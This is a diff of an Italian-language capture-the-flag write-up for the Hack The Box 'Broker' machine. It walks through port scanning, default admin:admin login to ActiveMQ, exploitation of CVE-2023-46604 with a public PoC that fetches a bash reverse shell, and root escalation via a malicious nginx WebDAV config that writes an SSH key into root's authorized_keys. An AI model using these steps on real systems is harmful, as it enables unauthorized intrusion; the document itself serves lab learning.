@@ -1,6 +1,8 @@
+# Broker
+
 **TARGET 10.10.11.243**
 
-# INFORMATION GATHERING
+## INFORMATION GATHERING
 
 Per prima cosa lanciamo un rapido scan con [Nmap](Note/Tool/Nmap.md)
 
@@ -28,12 +30,13 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 9.52 seconds
 ```
 
-Abbiamo due porte aperte 
+Abbiamo due porte aperte
 
-- 22 ssh OpenSSH 8.9p1 
-- 80  http    nginx 1.18.0 (Ubuntu)
+* 22 ssh OpenSSH 8.9p1
+* 80 http nginx 1.18.0 (Ubuntu)
 
 Uno scan piu approfondito su tutte le porte ne rileva altre aperte
+
 ```shell-session
 ┌──(root㉿kali)-[/home/kali/htb/broker]
 └─# nmap -sV -sC -p- --min-rate=5000 10.10.11.243
@@ -169,60 +172,51 @@ Nmap done: 1 IP address (1 host up) scanned in 54.95 seconds
 
 ```
 
-Quindi facciamo un breve riepilogo 
+Quindi facciamo un breve riepilogo
 
-- 22 ssh OpenSSH 8.9p1 
-- 80  http    nginx 1.18.0 (Ubuntu)
-- 1337 http       nginx 1.18.0 
-- 1883 mqtt
-- 5672   open  amqp?
-- 8161 http       Jetty 9.4.39.v20210325
-- 43503 tcpwrapped
-- 61613  stomp      Apache ActiveMQ
-- 61614      Jetty 9.4.39.v20210325
-- 61616 apachemq   ActiveMQ OpenWire transport
+* 22 ssh OpenSSH 8.9p1
+* 80 http nginx 1.18.0 (Ubuntu)
+* 1337 http nginx 1.18.0
+* 1883 mqtt
+* 5672 open amqp?
+* 8161 http Jetty 9.4.39.v20210325
+* 43503 tcpwrapped
+* 61613 stomp Apache ActiveMQ
+* 61614 Jetty 9.4.39.v20210325
+* 61616 apachemq ActiveMQ OpenWire transport
 
-Sono parecchie, procediamo con calma 
+Sono parecchie, procediamo con calma
 
-# ENUMERATION
-
+## ENUMERATION
 
 Data la versione recente di ssh sulla porta 22 avrò bisogno di credenziali valide per accedervi quindi iniziamo dalla numero porta 80
 
-## Port 80
+### Port 80
 
-Visitamo`10.10.11.243` 
-![](../zzz_rev/attachments/broker.png)
-Ci chiede username e password proviamo con alcuni combinazioni standard 
-`admin:admin` funziona!
-Veniamo indirizzati endpoint http://10.10.11.243/index.html
+Visitamo`10.10.11.243` ![](../zzz\_rev/attachments/broker.png) Ci chiede username e password proviamo con alcuni combinazioni standard `admin:admin` funziona! Veniamo indirizzati endpoint http://10.10.11.243/index.html
 
-![](../zzz_rev/attachments/broker3.png)
+![](../zzz\_rev/attachments/broker3.png)
 
-**ActiveMQ** è un [message-oriented middleware](https://it.wikipedia.org/wiki/Message-oriented_middleware "Message-oriented middleware") (detto anche [broker di messaggistica](https://it.wikipedia.org/w/index.php?title=Broker_di_messaggistica&action=edit&redlink=1 "Broker di messaggistica (la pagina non esiste)")) scritto in [Java](https://it.wikipedia.org/wiki/Java_(linguaggio_di_programmazione) "Java (linguaggio di programmazione)") che dispone di un completo client [Java Message Service](https://it.wikipedia.org/wiki/Java_Message_Service "Java Message Service") (JMS). Implementa diversi protocolli di message queue:
+**ActiveMQ** è un [message-oriented middleware](https://it.wikipedia.org/wiki/Message-oriented\_middleware) (detto anche [broker di messaggistica](https://it.wikipedia.org/w/index.php?title=Broker\_di\_messaggistica\&action=edit\&redlink=1)) scritto in [Java](https://it.wikipedia.org/wiki/Java\_\(linguaggio\_di\_programmazione\)) che dispone di un completo client [Java Message Service](https://it.wikipedia.org/wiki/Java\_Message\_Service) (JMS). Implementa diversi protocolli di message queue:
 
-- [OpenWire](https://it.wikipedia.org/w/index.php?title=OpenWire&action=edit&redlink=1 "OpenWire (la pagina non esiste)") : nativo
-- [AMQP](https://it.wikipedia.org/wiki/Advanced_Message_Queuing_Protocol "Advanced Message Queuing Protocol")
-- [MQTT](https://it.wikipedia.org/wiki/MQTT "MQTT")
-- [STOMP](https://it.wikipedia.org/w/index.php?title=STOMP&action=edit&redlink=1 "STOMP (la pagina non esiste)")
+* [OpenWire](https://it.wikipedia.org/w/index.php?title=OpenWire\&action=edit\&redlink=1) : nativo
+* [AMQP](https://it.wikipedia.org/wiki/Advanced\_Message\_Queuing\_Protocol)
+* [MQTT](https://it.wikipedia.org/wiki/MQTT)
+* [STOMP](https://it.wikipedia.org/w/index.php?title=STOMP\&action=edit\&redlink=1)
 
-abbiamo due link
-Il pirmo link ci rimanda ad `/admin`
+abbiamo due link Il pirmo link ci rimanda ad `/admin`
 
-![](../zzz_rev/attachments/broker1.png)
-Mentre il secondo link ci rimanda a `/demo` dove possiamo vedere la verisone di Jetty 9.4.39 v20210325 trovata anche da nmap.
+![](../zzz\_rev/attachments/broker1.png) Mentre il secondo link ci rimanda a `/demo` dove possiamo vedere la verisone di Jetty 9.4.39 v20210325 trovata anche da nmap.
 
-![](../zzz_rev/attachments/broker2.png)ho provato a cercare con searchsploit se abbiamo qualche vulnerabiltà nota per `jetty 9.4.39` e `ActiveMQ`  ma non ho trovato niente...passiamo alla ricerca su google.
+![](../zzz\_rev/attachments/broker2.png)ho provato a cercare con searchsploit se abbiamo qualche vulnerabiltà nota per `jetty 9.4.39` e `ActiveMQ` ma non ho trovato niente...passiamo alla ricerca su google.
 
-# GAINING AN INITIAL FOOTHOLD 
+## GAINING AN INITIAL FOOTHOLD
 
-Su google troviamo più riferimenti alla  CVE-2023-46604.
-Questa vulnerabilità critica nel broker di messaggi ActiveMQ, permette agli aggressori non autenticati di eseguire comandi shell arbitrari sui server compromessi. La vulnerabilità consente l'esecuzione di codice in modalità remota a causa di pratiche di deserializzazione non sicure all'interno del protocollo OpenWire.
+Su google troviamo più riferimenti alla  CVE-2023-46604. Questa vulnerabilità critica nel broker di messaggi ActiveMQ, permette agli aggressori non autenticati di eseguire comandi shell arbitrari sui server compromessi. La vulnerabilità consente l'esecuzione di codice in modalità remota a causa di pratiche di deserializzazione non sicure all'interno del protocollo OpenWire.
 
-> [!NOTA] [questo](https://www.matricedigitale.it/multilingua/ransomware-tellyouthepass-su-server-apache-activemq/) e [questo](https://www.helpnetsecurity.com/2023/11/02/cve-2023-46604-ransomware/)articolo mostrano che questa RCE è stata sfrutta attivamente per attacchi ransomware
+> \[!NOTA] [questo](https://www.matricedigitale.it/multilingua/ransomware-tellyouthepass-su-server-apache-activemq/) e [questo](https://www.helpnetsecurity.com/2023/11/02/cve-2023-46604-ransomware/)articolo mostrano che questa RCE è stata sfrutta attivamente per attacchi ransomware
 
-Troviamo anche [Questa PoC](https://github.com/evkl1d/CVE-2023-46604) che sembra fare al caso nostro.
-ce lo scarichiamo e  procediamo.
+Troviamo anche [Questa PoC](https://github.com/evkl1d/CVE-2023-46604) che sembra fare al caso nostro. ce lo scarichiamo e procediamo.
 
 Per utilizzare lo script di exploit, è necessario fornire l'indirizzo IP del server ActiveMQ di destinazione, il numero di porta (il valore predefinito è 61616) e l'URL del file poc.xml.
 
@@ -267,24 +261,26 @@ exploit.py  poc.xml  README.md
     </beans>
 ```
 
+vediamo che all'interno del file poc.xml abbiamo quella che è una revshell in bash. modifichiamo l'indirizzo IP delle revshell con il nostro indirizzo IP.
 
-vediamo che all'interno del file poc.xml abbiamo quella che è  una revshell in bash. modifichiamo l'indirizzo IP delle revshell con il nostro indirizzo IP.
+Tiriamo un su un sever python dove abbiamo il nostro file `.xml`
 
-Tiriamo un su un sever python dove abbiamo il nostro file `.xml`  
 ```bash
 ┌──(root㉿kali)-[/home/kali/htb/broker/CVE-2023-46604]
 └─# python -m http.server 8000
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
 
-ci mettiamo in ascolto con nc 
+ci mettiamo in ascolto con nc
+
 ```bash
 ┌──(root㉿kali)-[/home/kali/htb/broker]
 └─# nc -lvnp 9001
 listening on [any] 9001 ...
 ```
 
-eseguiamo l'exploit 
+eseguiamo l'exploit
+
 ```bash
 ┌──(root㉿kali)-[/home/kali/htb/broker/CVE-2023-46604]
 └─# python3 exploit.py -i 10.10.11.243 -u http://10.10.14.48:8000/poc.xml
@@ -312,6 +308,7 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
 
 e la nostra shell
+
 ```bash
 ┌──(root㉿kali)-[/home/kali/htb/broker]
 └─# nc -lvnp 9001
@@ -325,14 +322,14 @@ uid=1000(activemq) gid=1000(activemq) groups=1000(activemq)
 activemq@broker:/opt/apache-activemq-5.15.15/bin$
 ```
 
-e dopo aver effettuato l'upgrade della shell ci prediamo la nostra user_flag.
+e dopo aver effettuato l'upgrade della shell ci prediamo la nostra user\_flag.
 
 ```bash
 activemq@broker:~$ cat user.txt
 44a2cc459f6064de0dbccc00bc0d92f4
 ```
 
-# PRIVESC
+## PRIVESC
 
 Una della prime cose da fare e vedere se possiamo eseguire qualcosa come root e per farlo usiamo il comando `sudo -l`
 
@@ -347,7 +344,7 @@ User activemq may run the following commands on broker:
     (ALL : ALL) NOPASSWD: /usr/sbin/nginx
 ```
 
-Utilizzeremo ngx_http_dav_module per scrivere la nostra chiave SSH pubblica nel file authentic_keys dell'utente root. Per fare ciò, iniziamo creando il file di configurazione NGINX dannoso, che appare come segue:
+Utilizzeremo ngx\_http\_dav\_module per scrivere la nostra chiave SSH pubblica nel file authentic\_keys dell'utente root. Per fare ciò, iniziamo creando il file di configurazione NGINX dannoso, che appare come segue:
 
 ```bash
 user root;
@@ -373,9 +370,10 @@ http {
 ```
 
 Le parti fondamentali sono le seguenti:
-- user root: i processi di lavoro verranno eseguiti da root, ovvero quando eventualmente caricheremo un file, anch'esso sarà di proprietà di root .
-- root /: la radice del documento sarà la directory più in alto del filesystem.
-- dav_methods PUT: abilitiamo l'estensione HTTP WebDAV con il metodo PUT, che consente ai client di caricare file.
+
+* user root: i processi di lavoro verranno eseguiti da root, ovvero quando eventualmente caricheremo un file, anch'esso sarà di proprietà di root .
+* root /: la radice del documento sarà la directory più in alto del filesystem.
+* dav\_methods PUT: abilitiamo l'estensione HTTP WebDAV con il metodo PUT, che consente ai client di caricare file.
 
 Salviamo le impostazioni in un file e configuriamo NGINX per utilizzarlo tramite il flag -c.
 
@@ -411,7 +409,7 @@ The key's randomart image is:
 
 ```
 
-con curl carichiamo la chiave `borker.pub` sul target 
+con curl carichiamo la chiave `borker.pub` sul target
 
 ```
 ┌──(root㉿kali)-[/home/kali/htb/broker/CVE-2023-46604]
@@ -422,7 +420,7 @@ con curl carichiamo la chiave `borker.pub` sul target
 
 ```
 
-non ci resta che collegarci tramite ssh 
+non ci resta che collegarci tramite ssh
 
 ```bash
 ┌──(root㉿kali)-[/home/kali/htb/broker/CVE-2023-46604]
@@ -470,4 +468,3 @@ uid=0(root) gid=0(root) groups=0(root)
 root@broker:~# cat /root/root.txt
 f0d75f5a65b42a4dbe3a5b14ad373bc6
 ```
-
